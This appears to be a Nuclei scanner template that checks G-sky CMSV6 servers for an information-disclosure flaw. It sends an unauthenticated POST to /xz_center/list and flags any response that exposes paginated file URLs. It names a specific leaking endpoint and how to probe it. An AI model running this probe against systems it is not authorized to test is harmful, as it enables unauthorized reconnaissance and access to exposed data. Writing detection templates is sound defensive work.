http:
    - matchers:
        - condition: and
          dsl:
            - status_code_1 == 200
            - contains_all(body_1, "data", "pagination", "fileUrl")
          type: dsl
      matchers-condition: and
      raw:
        - |
          POST /xz_center/list HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
          Accept: */*
          Accept-Encoding: gzip, deflate
          Connection: close

          page=1
id: G-sky-CMSV6-list-infovul
info:
    author: pitaya
    name: G-sky-CMSV6-list-infovul
    severity: high
    tags:
        - fedora
